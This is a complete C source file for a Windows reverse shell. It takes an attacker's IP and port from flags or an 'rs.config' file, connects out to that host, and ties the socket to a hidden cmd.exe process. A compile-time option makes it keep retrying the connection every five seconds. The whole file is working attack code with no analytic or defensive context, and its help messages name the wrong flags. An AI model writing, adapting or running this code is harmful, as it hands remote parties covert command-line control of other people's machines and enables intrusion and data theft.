#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_LINE_LENGTH 256
#define MAX_IP_LENGTH 50
#define MAX_PORT_LENGTH 20

typedef struct {
    char server_ip[MAX_IP_LENGTH];
    int  server_port;
} Config;

static int parse_args(int argc, char *argv[], Config *config,
                      int *ip_found, int *port_found) {
    *ip_found = 0;
    *port_found = 0;

    for (int i = 1; i < argc; i++) {
        const char *arg = argv[i];

        if (strcmp(arg, "--server-ip") == 0) {
            if (i + 1 >= argc) {
                printf("Error: --server-ip requires a value\n");
                return -1;
            }
            strncpy(config->server_ip, argv[++i], MAX_IP_LENGTH - 1);
            config->server_ip[MAX_IP_LENGTH - 1] = '\0';
            *ip_found = 1;
        } else if (strncmp(arg, "--server-ip=", 12) == 0) {
            strncpy(config->server_ip, arg + 12, MAX_IP_LENGTH - 1);
            config->server_ip[MAX_IP_LENGTH - 1] = '\0';
            *ip_found = 1;
        }

        else if (strcmp(arg, "--server-port") == 0) {
            if (i + 1 >= argc) {
                printf("Error: --server-port requires a value\n");
                return -1;
            }
            config->server_port = atoi(argv[++i]);
            *port_found = 1;
        } else if (strncmp(arg, "--server-port=", 14) == 0) {
            config->server_port = atoi(arg + 14);
            *port_found = 1;
        }
    }

    return 0;
}

int read_config(const char *filename, Config *config, int *ip_found, int *port_found) {
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        printf("Error: Could not open file '%s'\n", filename);
        return -1;
    }

    char line[MAX_LINE_LENGTH];

    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\n")] = '\0';

        if (line[0] == '\0' || line[0] == '#') {
            continue;
        }

        if (!*ip_found && strncmp(line, "SERVER_IP=", 10) == 0) {
            strncpy(config->server_ip, line + 10, MAX_IP_LENGTH - 1);
            config->server_ip[MAX_IP_LENGTH - 1] = '\0';
            *ip_found = 1;
        }

        if (!*port_found && strncmp(line, "SERVER_PORT=", 12) == 0) {
            config->server_port = atoi(line + 12);
            *port_found = 1;
        }
    }

    fclose(file);
    return 0;
}

int main(int argc, char *argv[]) {
    Config config;
    int ip_found = 0, port_found = 0;

    strcpy(config.server_ip, "");
    config.server_port = 0;

    if (parse_args(argc, argv, &config, &ip_found, &port_found) != 0) {
        return 1;
    }

    if (!ip_found || !port_found) {
        if (read_config("rs.config", &config, &ip_found, &port_found) != 0) {
            printf("Failed to load configuration file\n");
            /* Only fatal if we still don't have everything */
            if (!ip_found || !port_found) {
                return 1;
            }
        }
    }

    if (!ip_found || !port_found) {
        printf("Error: Missing required configuration:\n");
        if (!ip_found)   printf("  - server_ip (use --client-ip or SERVER_IP= in rs.config)\n");
        if (!port_found) printf("  - server_port (use --client-port or SERVER_PORT= in rs.config)\n");
        return 1;
    }

    printf("Configuration loaded successfully:\n");
    printf("SERVER_IP: %s\n", config.server_ip);
    printf("SERVER_PORT: %d\n", config.server_port);

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	int port = config.server_port;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(config.server_ip);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}
#endif

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}
